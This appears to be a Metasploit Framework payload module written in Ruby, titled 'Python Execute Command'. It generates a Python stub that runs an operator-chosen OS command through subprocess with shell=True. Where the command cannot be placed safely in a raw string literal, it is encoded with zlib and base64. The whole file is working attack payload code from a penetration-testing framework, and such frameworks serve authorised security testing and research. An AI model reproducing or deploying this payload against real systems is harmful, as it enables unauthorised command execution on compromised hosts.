module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Python

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Python Execute Command',
        'Description' => 'Execute an arbitrary OS command. Compatible with Python 2.7 and 3.4+.',
        'Author' => 'Spencer McIntyre',
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'PayloadType' => 'python',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_options(
      [
        OptString.new('CMD', [ true, 'The command string to execute' ]),
      ]
    )
  end

  def generate(_opts = {})
    super + command_string
  end

  def command_string
    py_code = %(from subprocess import Popen,PIPE\n)
    command = datastore['CMD']

    # Physical newlines can break raw literals or normalize CR/CRLF to LF;
    # trailing backslashes and quotes can interfere with their closing delimiter.
    # https://docs.python.org/3/reference/lexical_analysis.html#physical-lines
    raw_string_safe = !command.include?("\r") && !command.include?("\n") && !command.end_with?('\\')
    if raw_string_safe && !command.include?("'")
      py_code << %(args=[r'#{command}']\n)
    elsif raw_string_safe && !command.include?('"')
      py_code << %(args=[r"#{command}"]\n)
    elsif raw_string_safe && !command.include?("'''") && !command.end_with?("'")
      py_code << %(args=[r'''#{command}''']\n)
    elsif raw_string_safe && !command.include?('"""') && !command.end_with?('"')
      py_code << %(args=[r"""#{command}"""]\n)
    else
      encoded = Rex::Text.encode_base64(Rex::Text.zlib_deflate(command))
      py_code << %{import zlib,base64;args=[zlib.decompress(base64.b64decode('#{encoded}')).decode()]\n}
    end

    # Drain/close pipes and reap without blocking a persistent interpreter.
    # Bind the process method now; keep the daemon waiter local for repeated execs.
    py_code << %{(lambda waiter:(setattr(waiter,'daemon',True),waiter.start()))(__import__('threading').Thread(target=Popen(args,shell=True,stdin=PIPE,stdout=PIPE,stderr=PIPE).communicate))\n}

    py_create_exec_stub(py_code)
  end
end
